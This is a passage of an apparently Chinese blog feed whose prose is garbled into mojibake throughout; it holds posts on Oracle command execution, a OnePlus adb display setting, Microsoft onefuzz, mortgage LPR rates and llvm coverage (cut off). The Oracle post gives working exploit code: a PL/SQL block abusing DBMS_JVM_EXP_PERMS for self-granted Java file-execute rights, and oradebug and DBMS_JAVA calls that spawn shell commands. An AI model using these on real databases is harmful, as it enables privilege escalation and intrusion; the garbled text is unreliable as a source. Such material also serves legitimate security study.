class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs routeros">SQL&gt; oradebug help<br>HELP           [command]                 Describe one <span class="hljs-keyword">or</span> all commands<br>SETMYPID                                 <span class="hljs-built_in">Debug</span> current process<br>SETOSPID       &lt;ospid&gt;                   <span class="hljs-built_in">Set</span> OS pid of process <span class="hljs-keyword">to</span> <span class="hljs-built_in">debug</span><br>SETORAPID      &lt;orapid&gt; [<span class="hljs-string">&#x27;force&#x27;</span>]        <span class="hljs-built_in">Set</span> Oracle pid of process <span class="hljs-keyword">to</span> <span class="hljs-built_in">debug</span><br>SETORAPNAME    &lt;orapname&gt;                <span class="hljs-built_in">Set</span> Oracle process name <span class="hljs-keyword">to</span> <span class="hljs-built_in">debug</span><br>SHORT_STACK                              <span class="hljs-built_in">Get</span> abridged OS stack<br>CURRENT_SQL                              <span class="hljs-built_in">Get</span> current SQL<br>DUMP           &lt;dump_name&gt; &lt;lvl&gt; [addr]  Invoke named dump<br>DUMPSGA        [bytes]                   Dump fixed SGA<br>DUMPLIST                                 <span class="hljs-built_in">Print</span> a list of available dumps<br>EVENT          &lt;text&gt;                    <span class="hljs-built_in">Set</span> trace event <span class="hljs-keyword">in</span> process<br>SESSION_EVENT  &lt;text&gt;                    <span class="hljs-built_in">Set</span> trace event <span class="hljs-keyword">in</span> session<br>DUMPVAR        &lt;p|s|uga&gt; &lt;name&gt; [level]  Print/dump a fixed PGA/SGA/UGA variable<br>DUMPTYPE       &lt;address&gt; &lt;type&gt; &lt;count&gt;  Print/dump an<span class="hljs-built_in"> address </span>with<span class="hljs-built_in"> type </span><span class="hljs-built_in">info</span><br>SETVAR         &lt;p|s|uga&gt; &lt;name&gt; &lt;value&gt;  Modify a fixed PGA/SGA/UGA variable<br>PEEK           &lt;addr&gt; &lt;len&gt; [level]      Print/Dump memory<br>POKE           &lt;addr&gt; &lt;len&gt; &lt;value&gt;      Modify memory<br>WAKEUP         &lt;orapid&gt;                  Wake up Oracle process<br>SUSPEND                                  Suspend execution<br>RESUME                                   Resume execution<br>FLUSH                                    Flush pending writes <span class="hljs-keyword">to</span> trace file<br>CLOSE_TRACE                              Close trace file<br>TRACEFILE_NAME                           <span class="hljs-built_in">Get</span> name of trace file<br>LKDEBUG                                  Invoke global enqueue<span class="hljs-built_in"> service </span>debugger<br>NSDBX                                    Invoke CGS name-service debugger<br>-G             &lt;Inst-List | def | all&gt;   Parallel oradebug command<span class="hljs-built_in"> prefix</span><br><span class="hljs-built_in"></span>-R             &lt;Inst-List | def | all&gt;   Parallel oradebug<span class="hljs-built_in"> prefix </span>(return output<br>SETINST        &lt;instance# <span class="hljs-built_in">..</span> | all&gt;      <span class="hljs-built_in">Set</span><span class="hljs-built_in"> instance </span>list <span class="hljs-keyword">in</span> double quotes<br>SGATOFILE      &lt;SGA dump dir&gt;         Dump SGA <span class="hljs-keyword">to</span> file; dirname <span class="hljs-keyword">in</span> double quotes<br>DMPCOWSGA      &lt;SGA dump dir&gt; Dump &amp; map SGA as COW; dirname <span class="hljs-keyword">in</span> double quotes<br>MAPCOWSGA      &lt;SGA dump dir&gt;         Map SGA as COW; dirname <span class="hljs-keyword">in</span> double quotes<br>HANGANALYZE    [level] [syslevel]        Analyze<span class="hljs-built_in"> system </span>hang<br>FFBEGIN                                  Flash Freeze the<span class="hljs-built_in"> Instance</span><br><span class="hljs-built_in"></span>FFDEREGISTER                             FF deregister<span class="hljs-built_in"> instance </span><span class="hljs-keyword">from</span> cluster<br>FFTERMINST                               Call exit <span class="hljs-keyword">and</span> terminate<span class="hljs-built_in"> instance</span><br><span class="hljs-built_in"></span>FFRESUMEINST                             Resume the flash frozen<span class="hljs-built_in"> instance</span><br><span class="hljs-built_in"></span>FFSTATUS                                 Flash freeze status of<span class="hljs-built_in"> instance</span><br><span class="hljs-built_in"></span>SKDSTTPCS      &lt;ifname&gt;  &lt;ofname&gt;        Helps translate PCs <span class="hljs-keyword">to</span> names<br>WATCH          &lt;address&gt; &lt;len&gt; &lt;self|exist|all|target&gt;  Watch a region of memory<br>DELETE         &lt;local|global|target&gt; watchpoint &lt;id&gt;    Delete a watchpoint<br>SHOW           &lt;local|global|target&gt; watchpoints        Show  watchpoints<br>DIRECT_ACCESS  &lt;set/enable/<span class="hljs-built_in">disable</span> command | select query&gt; Fixed table access<br>CORE                                     Dump core without crashing process<br>IPC                                      Dump ipc information<br>UNLIMIT                                  Unlimit the size of the trace file<br>PROCSTAT                                 Dump process statistics<br>CALL           [-t count] &lt;func&gt; [arg1]<span class="hljs-built_in">..</span>.[argn]  Invoke function with arguments<br></code></pre></td></tr></table></figure><p>åŠŸèƒ½éå¸¸ä¸°å¯Œï¼Œ ä¸‹é¢æˆ‘ä»¬ç”¨åˆ°çš„æ˜¯ CALL å¯ä»¥ç›´æ¥è°ƒç”¨oracleè¿›ç¨‹ä½¿ç”¨çš„å‡½æ•°ã€‚</p><h4 id="æ‰§è¡Œçš„è¯­å¥"><a href="#æ‰§è¡Œçš„è¯­å¥" class="headerlink" title="æ‰§è¡Œçš„è¯­å¥"></a>æ‰§è¡Œçš„è¯­å¥</h4><p><code>oradebug setmypid; oradebug call system &quot;/usr/bin/whoami      &gt;/tmp/ret&quot;;</code></p><h4 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h4><ol><li>è¿™é‡Œæƒé™è¦æ±‚æ˜¯SYSDBA</li><li>åŒå¼•å·é‡Œå¿…é¡»æ˜¯ä½¿ç”¨TABè€Œä¸èƒ½ä½¿ç”¨ç©ºæ ¼</li><li>Linux å’Œ Windows ä¸‹çš„ORACLEéƒ½èƒ½åˆ©ç”¨æˆåŠŸ</li></ol><h2 id="2-é»‘å®¢æ–¹æ³•"><a href="#2-é»‘å®¢æ–¹æ³•" class="headerlink" title="2. é»‘å®¢æ–¹æ³•"></a>2. é»‘å®¢æ–¹æ³•</h2><p>ä¸‹é¢ç”¨åˆ°çš„ä¸¤ä¸ªæ–¹æ³•æ˜¯David Litchfield åœ¨Blackhat DC 2010 ä¸Šå…¬å¼€ä¸¤ä¸ªæ–¹æ³•,é€šè¿‡é€†å‘<br>å‘ç°ã€‚ç»“åˆDBMS_JVM_EXP_PERMSçš„æ¼æ´å¯ä»¥ç›´æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤(DBMS_JVM_EXP_PERMS æ¼æ´<br>å·²ç»è¢«è¢«ä¿®å¤)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">DECLARE<br>POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;<br>CURSOR C1 IS SELECT â€˜GRANTâ€™,USER(), â€˜SYSâ€™,<span class="hljs-string">&#x27;java.io.FilePermissionâ€™,â€™&lt;&lt;ALL FILES&gt;&gt;â€˜,â€™executeâ€™,&#x27;</span>ENABLEDâ€™ from dual;<br>BEGIN<br>OPEN C1;<br>FETCH C1 BULK COLLECT INTO POL;<br>CLOSE C1;<br>DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);<br>END;<br>/<br></code></pre></td></tr></table></figure><p>åœ¨æœ‰æ¼æ´çš„DBMS_JVM_EXP_PERMS packageçš„Oracleä¸Šæ‰§è¡Œä¸Šè¿°è¯­å¥ï¼Œæœ‰create session<br>æƒé™çš„ç”¨æˆ·å¯ä»¥ç»™è‡ªå·±æˆæƒæ‰€æœ‰java æƒé™ã€‚</p><h3 id="2-1-DBMS-JAVA-TEST-FUNCALL"><a href="#2-1-DBMS-JAVA-TEST-FUNCALL" class="headerlink" title="2.1 DBMS_JAVA_TEST.FUNCALL"></a>2.1 DBMS_JAVA_TEST.FUNCALL</h3><h4 id="2-1-1-æ‰§è¡Œçš„è¯­å¥"><a href="#2-1-1-æ‰§è¡Œçš„è¯­å¥" class="headerlink" title="2.1.1 æ‰§è¡Œçš„è¯­å¥"></a>2.1.1 æ‰§è¡Œçš„è¯­å¥</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">Select</span> DBMS_JAVA_TEST.FUNCALL(<span class="hljs-string">&#x27;oracle/aurora/util/Wrapper&#x27;</span>,<span class="hljs-string">&#x27;main&#x27;</span>,<span class="hljs-string">&#x27;/bin/bash&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>,<span class="hljs-string">&#x27;/bin/ls&gt;/tmp/OUT2.LST&#x27;</span>) <span class="hljs-keyword">from</span> dual;<br></code></pre></td></tr></table></figure><h4 id="2-1-2-éœ€è¦çš„æƒé™"><a href="#2-1-2-éœ€è¦çš„æƒé™" class="headerlink" title="2.1.2 éœ€è¦çš„æƒé™"></a>2.1.2 éœ€è¦çš„æƒé™</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">exec</span> dbms_java.grant_permission(<span class="hljs-string">&#x27;SCOTT&#x27;</span>, <span class="hljs-string">&#x27;SYS:java.io.FilePermission&#x27;</span>,<span class="hljs-string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;execute&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="2-1-3-å—å½±å“ç³»ç»Ÿ"><a href="#2-1-3-å—å½±å“ç³»ç»Ÿ" class="headerlink" title="2.1.3 å—å½±å“ç³»ç»Ÿ"></a>2.1.3 å—å½±å“ç³»ç»Ÿ</h4><p>11g R1, 11g R2</p><h3 id="2-2-DBMS-JAVA-RUNJAVA"><a href="#2-2-DBMS-JAVA-RUNJAVA" class="headerlink" title="2.2 DBMS_JAVA.RUNJAVA"></a>2.2 DBMS_JAVA.RUNJAVA</h3><h4 id="2-2-1-æ‰§è¡Œçš„è¯­å¥"><a href="#2-2-1-æ‰§è¡Œçš„è¯­å¥" class="headerlink" title="2.2.1 æ‰§è¡Œçš„è¯­å¥"></a>2.2.1 æ‰§è¡Œçš„è¯­å¥</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> DBMS_JAVA.RUNJAVA(<span class="hljs-string">&#x27;oracle/aurora/util/Wrapper /bin/bash -c /bin/ls&gt;/tmp/OUT.LST&#x27;</span>) <span class="hljs-keyword">FROM</span> DUAL;<br></code></pre></td></tr></table></figure><h4 id="2-2-2-éœ€è¦çš„æƒé™"><a href="#2-2-2-éœ€è¦çš„æƒé™" class="headerlink" title="2.2.2 éœ€è¦çš„æƒé™"></a>2.2.2 éœ€è¦çš„æƒé™</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">exec</span> dbms_java.grant_permission(<span class="hljs-string">&#x27;SCOTT&#x27;</span>, <span class="hljs-string">&#x27;SYS:java.io.FilePermission&#x27;</span>,<span class="hljs-string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;execute&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="2-2-3-å—å½±å“ç³»ç»Ÿ"><a href="#2-2-3-å—å½±å“ç³»ç»Ÿ" class="headerlink" title="2.2.3 å—å½±å“ç³»ç»Ÿ"></a>2.2.3 å—å½±å“ç³»ç»Ÿ</h4><p>10g R2, 11g R1, 11g R2</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ol><li><a href="http://www.orafaq.com/scripts/plsql/oscmd.txt">Using Java to run os command</a></li><li><a href="http://docs.oracle.com/cd/B28359_01/server.111/b28310/scheduse002.htm#CHDIDGAE">DBMS_SCHEDULER</a></li><li><a href="http://www.juliandyke.com/Diagnostics/Tools/ORADEBUG/ORADEBUG.html">oradebug</a></li><li><a href="">BlackHat-DC-2010-Litchfield-Oracle11g</a></li><li><a href="http://media.blackhat.com/bh-us-10/whitepapers/Siddharth/BlackHat-USA-2010-Siddharth-Hacking-Oracle-from-the-Web-wp.pdf">Hacking Oracle from the Web</a></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¸€åŠ  (oneplus ) 3T éroot å¼€å¯ P3 è‰²åŸŸ</title>
    <link href="/cn/oneplus3T_p3/"/>
    <url>/cn/oneplus3T_p3/</url>
    
    <content type="html"><![CDATA[<p>ä¸€åŠ 3Tå…¶å®å’Œä¸€åŠ 5ç”¨çš„æ˜¯åŒä¸€å—å±å¹•ï¼Œç½‘ä¸Šæµä¼ çš„æ–¹æ³•å¤šéœ€è¦rootæƒé™ã€‚éroot å¼€å¯ p3 è‰²åŸŸçš„æ–¹æ³•ï¼Œ<br>è¿æ¥ adb è¾“å…¥ä¸‹é¢çš„å‘½ä»¤ <code>settings put system screen_color_mode_settings_value 4</code> å®æµ‹æœ‰æ•ˆï¼Œé‡å¯åä¸å¤±æ•ˆã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>Life</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>onefuzz ç®€å•åˆ†æ</title>
    <link href="/cn/onefuzz/"/>
    <url>/cn/onefuzz/</url>
    
    <content type="html"><![CDATA[<h2 id="deploy-agent-éƒ¨ç½²"><a href="#deploy-agent-éƒ¨ç½²" class="headerlink" title="deploy agent (éƒ¨ç½²)"></a>deploy agent (éƒ¨ç½²)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">unzip onefuzz-deployment-<span class="hljs-variable">$VERSION</span>.zip<br>pip install -r requirements.txt<br>./deploy.py <span class="hljs-variable">$REGION</span> <span class="hljs-variable">$RESOURCE_GROUP_NAME</span> <span class="hljs-variable">$ONEFUZZ_INSTANCE_NAME</span> <span class="hljs-variable">$CONTACT_EMAIL_ADDRESS</span><br></code></pre></td></tr></table></figure><p><a href="https://docs.microsoft.com/en-us/cli/azure/authenticate-azure-cli?view=azure-cli-latest">Azure CLI logged in</a> åï¼Œæ‰§è¡Œä¸Šé¢å‘½ä»¤å¯ä»¥åœ¨ Azure ä¸Šéƒ¨ç½² agent</p><p>éœ€è¦è®¢é˜… Azureï¼Œ å¯èƒ½è¦æ”¶è´¹</p><h2 id="å®‰è£…-onefuzz-CLI"><a href="#å®‰è£…-onefuzz-CLI" class="headerlink" title="å®‰è£… onefuzz CLI"></a>å®‰è£… onefuzz CLI</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://github.com/microsoft/onefuzz/releases/download/1.0.0/onefuzz-1.0.0-py3-none-any.whl<br>wget https://github.com/microsoft/onefuzz/releases/download/1.0.0/onefuzztypes-1.0.0-py3-none-any.whl<br>pip install ./onefuzz*.whl<br></code></pre></td></tr></table></figure><h2 id="æ‰§è¡Œ-fuzz-ä»»åŠ¡"><a href="#æ‰§è¡Œ-fuzz-ä»»åŠ¡" class="headerlink" title="æ‰§è¡Œ fuzz ä»»åŠ¡"></a>æ‰§è¡Œ fuzz ä»»åŠ¡</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">onefuzz template libfuzzer basic <span class="hljs-keyword">my</span>-project <span class="hljs-keyword">my</span>-target build<span class="hljs-number">-1</span> <span class="hljs-keyword">my</span>-pool <span class="hljs-comment">--target_exe fuzz.exe</span><br></code></pre></td></tr></table></figure><h2 id="æ”¯æŒçš„å¹³å°"><a href="#æ”¯æŒçš„å¹³å°" class="headerlink" title="æ”¯æŒçš„å¹³å°"></a>æ”¯æŒçš„å¹³å°</h2><ol><li>Python çš„ CLI å®¢æˆ·ç«¯ï¼Œéœ€è¦ Python 3.7 +</li><li>Azure çš„ OS image æ”¯æŒ Windows 10 å’Œ Ubuntu Server 18.04</li><li>libfuzzer æ”¯æŒ llvm 8+ (windows, Linux x86&#x2F;x64), MSVC 16.8+ (æ”¯æŒ ASAN)</li></ol><h2 id="æ”¯æŒçš„-Fuzz-å·¥å…·"><a href="#æ”¯æŒçš„-Fuzz-å·¥å…·" class="headerlink" title="æ”¯æŒçš„ Fuzz å·¥å…·"></a>æ”¯æŒçš„ Fuzz å·¥å…·</h2><p>onefuzz ä¸­é›†æˆäº†å‡ ä¸ª fuzz å·¥å…·ï¼š afl afl++ libfuzzer å’Œ radasma</p><h2 id="OneFuzz-çš„ä¸»è¦å·¥ä½œ"><a href="#OneFuzz-çš„ä¸»è¦å·¥ä½œ" class="headerlink" title="OneFuzz çš„ä¸»è¦å·¥ä½œ"></a>OneFuzz çš„ä¸»è¦å·¥ä½œ</h2><p>ä¸»è¦å·¥ä½œæ˜¯åˆ©ç”¨å¾®è½¯çš„ Azure äº‘å¹³å°è¿›è¡Œ fuzzï¼Œå®ç°äº† Python ç‰ˆæœ¬çš„æ¥å£ï¼Œå¯ä»¥è¿œç¨‹ç›´æ¥æ“ä½œ Azure çš„èµ„æºè¿›è¡Œ fuzz</p><p>api æ¥å£ï¼š <a href="https://github.com/microsoft/onefuzz/tree/main/src/api-service/__app__">api-service</a><br>agentï¼š <a href="https://github.com/microsoft/onefuzz/tree/main/src/agent">agent</a></p><h2 id="é¡¹ç›®è¿›å±•æƒ…å†µ"><a href="#é¡¹ç›®è¿›å±•æƒ…å†µ" class="headerlink" title="é¡¹ç›®è¿›å±•æƒ…å†µ"></a>é¡¹ç›®è¿›å±•æƒ…å†µ</h2><p>onefuzz é¡¹ç›®ä¸»è¦æ˜¯ä¸€ä¸ª fuzz æ¡†æ¶ï¼Œé¡¹ç›®æˆç†Ÿåº¦ä¸é«˜å’Œ Google çš„ ClusterFuzz ç›¸æ¯”æœ‰è¾ƒå¤§å·®è·ã€‚Fuzz è¿‡ç¨‹ä¹Ÿæ˜¯ç®€å•è°ƒç”¨fuzz å·¥å…·ï¼Œæ²¡æœ‰å¤„ç†ç‰¹æ®Šæƒ…å†µã€‚æ–‡æ¡£å®Œå¤‡ç¨‹åº¦ä¹Ÿä¸é«˜ï¼Œæ¯”è¾ƒæ„Ÿå…´è¶£çš„ MSVC å’Œ libfuzzerã€ASAN çš„é›†æˆä¹Ÿæ²¡æœ‰çœ‹åˆ°å…·ä½“ä»£ç ã€‚å¦å¤–å’Œå¾®è½¯çš„ Azrue æ·±åº¦ç»‘å®šï¼Œç”¨èµ·æ¥ä¹Ÿä¸æ˜¯å¤ªæ–¹ä¾¿ï¼Œåç»­å°†ç»§ç»­å…³æ³¨æ­¤é¡¹ç›®çš„è¿›å±•æƒ…å†µã€‚</p><h2 id="ä¸€äº›æœ‰ç”¨çš„é“¾æ¥"><a href="#ä¸€äº›æœ‰ç”¨çš„é“¾æ¥" class="headerlink" title="ä¸€äº›æœ‰ç”¨çš„é“¾æ¥"></a>ä¸€äº›æœ‰ç”¨çš„é“¾æ¥</h2><p><a href="https://github.com/microsoft/onefuzz/blob/main/docs/getting-started.md">https://github.com/microsoft/onefuzz/blob/main/docs/getting-started.md</a><br><a href="https://github.com/microsoft/onefuzz/blob/main/docs/supported-platforms.md">https://github.com/microsoft/onefuzz/blob/main/docs/supported-platforms.md</a></p><h2 id="åœ¨çº¿æ¼”ç¤º"><a href="#åœ¨çº¿æ¼”ç¤º" class="headerlink" title="åœ¨çº¿æ¼”ç¤º"></a>åœ¨çº¿æ¼”ç¤º</h2><p><img src="https://raw.githubusercontent.com/microsoft/onefuzz/main/docs/screencasts/launching-job.gif" alt="launching-job"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>lpr å’Œæˆ¿è´·çš„é‚£äº›äº‹</title>
    <link href="/cn/lpr/"/>
    <url>/cn/lpr/</url>
    
    <content type="html"><![CDATA[<h2 id="åŸæ¥çš„æœºåˆ¶"><a href="#åŸæ¥çš„æœºåˆ¶" class="headerlink" title="åŸæ¥çš„æœºåˆ¶"></a>åŸæ¥çš„æœºåˆ¶</h2><p>åœ¨ LPR ä¹‹å‰ï¼Œæˆ‘å›½è´·æ¬¾åˆ©ç‡é”šå®š ä¸­å›½äººæ°‘é“¶è¡Œå‘å¸ƒçš„ â€œè´·æ¬¾åŸºå‡†åˆ©ç‡â€ã€‚</p><figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fix"><span class="hljs-attr">æˆ¿è´·åˆ©ç‡ </span>=<span class="hljs-string"> è´·æ¬¾åŸºå‡†åˆ©ç‡ x ï¼ˆ1 + æµ®åŠ¨ï¼‰</span><br></code></pre></td></tr></table></figure><p>æµ®åŠ¨å¯ä»¥ä¸Šæµ®ï¼Œä¹Ÿå¯ä»¥ä¸‹æµ®ï¼Œ ä¸Šæµ®æ„å‘³ç€è´·æ¬¾åˆ©ç‡å¤§äºè´·æ¬¾åŸºå‡†åˆ©ç‡ï¼Œåä¹‹ä¸‹æµ®åˆ™æ˜¯å°äºã€‚</p><h2 id="LPR-æ–°æœºåˆ¶"><a href="#LPR-æ–°æœºåˆ¶" class="headerlink" title="LPR æ–°æœºåˆ¶"></a>LPR æ–°æœºåˆ¶</h2><p>MLF æ˜¯æˆ‘å›½å¤®è¡Œå‘å•†ä¸šé“¶è¡Œæ”¾è´·çš„ä¸€ç§æ–¹å¼ ï¼ˆä¸­æœŸå€Ÿæ¬¾ä¾¿åˆ©ï¼‰ï¼Œå•†ä¸šé“¶è¡Œå°†ä¸€äº›æŠµæŠ¼ç‰©è´¨æŠ¼ç»™å¤®è¡Œï¼Œæ¢å–ä¸€å®šæœŸé™ï¼Œæ•°é¢çš„è´·æ¬¾ï¼ŒåŒæ—¶å‘å¤®è¡Œæ”¯ä»˜åˆ©æ¯ã€‚å¤®è¡Œé€šè¿‡æ§åˆ¶ MLF çš„æ•°é‡æ€»é¢å’Œåˆ©ç‡ï¼Œä»è€Œå½±å“å¸‚åœºã€‚</p><p>å•†ä¸šé“¶è¡Œå¯ä»¥é€‰æ‹©ä»å¤®è¡Œè´·æ¬¾ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ä»å…¶ä»–é“¶è¡Œè´·æ¬¾ï¼Œæ‰€ä»¥ MLF ä¸èƒ½åç¦»å¸‚åœºå¤ªå¤šï¼Œä¹Ÿæ˜¯ä¸€ç§å¸‚åœºåŒ–çš„åˆ©ç‡è°ƒæ§æ‰‹æ®µã€‚</p><p>å•†ä¸šé“¶è¡Œæ‹¿åˆ°èµ„é‡‘åï¼Œéœ€è¦æ”¾è´·ç»™ä¸ªäººå’Œä¼ä¸šï¼Œæ”¾è´·éœ€è¦å‚è€ƒå¤®è¡Œçš„åŸºå‡†åˆ©ç‡ã€‚æ‰€ä»¥è¿™ç§å¸‚åœºä¸Šå°±æœ‰ä¸¤ç§åˆ©ç‡ï¼Œå¦‚æœè´·æ¬¾çš„åŸºå‡†åˆ©ç‡è¿‡é«˜ï¼Œé’±å°±ä¼šæ»ç•™é“¶è¡Œï¼Œè¿™æ ·å°±å¼•å…¥äº† LPRã€‚</p><p>é”šå®š LPRï¼Œä¹Ÿå°±æ˜¯æµ®åŠ¨åˆ©ç‡ï¼Œä¼šéšç€å¸‚åœºä¸Šèµ„é‡‘çš„å……ç›ˆç¨‹åº¦å˜åŒ–ã€‚</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">LPR</span> = MLF åˆ©ç‡ + é£é™©åˆ©æ¶¦åŠ ç‚¹<br></code></pre></td></tr></table></figure><p>é£é™©åˆ©æ¶¦åŠ ç‚¹ç”± 18å®¶é“¶è¡Œå†³å®šï¼Œè¿™18å®¶é“¶è¡Œæ˜¯ ä¸­å›½å·¥å•†é“¶è¡Œï¼Œä¸­å›½å†œä¸šé“¶è¡Œï¼Œä¸­å›½å»ºè®¾é“¶è¡Œï¼Œäº¤é€šé“¶è¡Œï¼Œä¸­ä¿¡é“¶è¡Œï¼Œæ‹›å•†é“¶è¡Œï¼Œå…´ä¸šé“¶è¡Œï¼Œæµ¦ä¸œå‘å±•é“¶è¡Œï¼Œä¸­å›½æ°‘ç”Ÿé“¶è¡Œï¼Œè¥¿å®‰é“¶è¡Œï¼Œå°å·é“¶è¡Œï¼Œä¸Šæµ·å†œæ‘å•†ä¸šé“¶è¡Œï¼Œ å¹¿ä¸œé¡ºå¾·å†œæ‘å•†ä¸šé“¶è¡Œï¼Œæ¸£æ‰“é“¶è¡Œï¼ˆä¸­å›½ï¼‰ï¼ŒèŠ±æ——é“¶è¡Œï¼ˆä¸­å›½ï¼‰ï¼Œå¾®ä¼—é“¶è¡Œï¼Œç½‘å•†é“¶è¡Œã€‚</p><p>LPR åˆ©ç‡æœ‰18å®¶æŠ¥ä»·ï¼Œå»æ‰ä¸€ä¸ªæœ€é«˜å€¼ï¼Œå»æ‰ä¸€ä¸ªæœ€ä½å€¼ï¼Œå‰©ä¸‹16å®¶å–ç®—æœ¯å¹³å‡å–å¾—ã€‚</p><p>ä¸ªäººæˆ–è€…ä¼ä¸šå‘é“¶è¡Œè´·æ¬¾æ—¶çš„åˆ©ç‡ï¼Œé€šè¿‡ LPR è®¡ç®—ã€‚</p><figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fix"><span class="hljs-attr">æˆ¿è´·åˆ©ç‡ </span>=<span class="hljs-string"> LPR åˆ©ç‡ + åŠ ç‚¹</span><br></code></pre></td></tr></table></figure><p>åŒæ ·åŠ ç‚¹å¯ä»¥ä¸Šæµ®ï¼Œä¹Ÿå¯ä»¥ä¸‹æµ®ï¼Œè¿™ä¸ªæ˜¯ä½ å’Œé“¶è¡Œä¹‹é—´çš„åè®®åŠ ç‚¹ã€‚æœ€ç»ˆçš„åˆ©ç‡è¿˜å’Œæ”¿ç­–åŠ ç‚¹æœ‰å…³ï¼Œæ¯”å¦‚æœ‰çš„åŸå¸‚è§„å®šï¼ŒäºŒå¥—æˆ¿ä¸Šæµ® 60ä¸ªåŸºç‚¹ ï¼ˆä¸€ä¸ªåŸºç‚¹ä¸º 0.01 %ï¼‰ï¼Œå³ä¸Šæµ® 0.6%</p><p>æ‰€ä»¥æœ€ç»ˆçš„å…¬å¼ä¸ºï¼š</p><figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fix"><span class="hljs-attr">æˆ¿è´·åˆ©ç‡ </span>=<span class="hljs-string"> LPR åˆ©ç‡ + æ”¿ç­–åŠ ç‚¹ + åè®®åŠ ç‚¹</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Life</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>llvm Coverage å¯è§†åŒ–</title>
    <link href="/cn/llvm_coverage/"/>
    <url>/cn/llvm_coverage/</url>
    
    <content type="html"><![CDATA[<h2 id="Google-æä¾›çš„å·¥å…·"><a href="#Google-æä¾›çš„å·¥å…·" class="headerlink" title="Google æä¾›çš„å·¥å…·"></a>Google æä¾›çš„å·¥å…·</h2><p>Google æä¾›äº†ä¸€ä¸ªå·¥å…· <a href="https://cs.chromium.org/chromium/src/tools/code_coverage/coverage.py">https://cs.chromium.org/chromium/src/tools/code_coverage/coverage.py</a></p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livescript">$ gn gen out/coverage <span class="hljs-string">\</span><br>    --args=<span class="hljs-string">&#x27;use_clang_coverage=true is_component_build=false dcheck_always_on=true&#x27;</span><br>$ python tools/code_coverage/coverage.py <span class="hljs-string">\</span><br>    crypto_unittests url_unittests <span class="hljs-string">\</span><br>    -b out/coverage -o out/report <span class="hljs-string">\</span><br>    -c <span class="hljs-string">&#x27;out/coverage/crypto_unittests&#x27;</span> <span class="hljs-string">\</span><br>    -c <span class="hljs-string">&#x27;out/coverage/url_unittests --gtest_filter=URLParser.PathURL&#x27;</span> <span class="hljs-string">\</span><br>    -f url/ -f crypto/<br></code></pre></td></tr></table></figure><p>ä¸€äº›å‚æ•°çš„å«ä¹‰:</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-b æµ‹è¯• coverage çš„ target çš„è·¯å¾„</span><br><span class="hljs-deletion">-o è¾“å‡ºæŠ¥å‘Šçš„è·¯å¾„</span><br><span class="hljs-deletion">-c æµ‹è¯• coverage çš„å‘½ä»¤è¡Œ</span><br><span class="hljs-deletion">-f è¿‡æ»¤ï¼Œåªæ˜¾ç¤ºæŸäº›è·¯å¾„çš„ 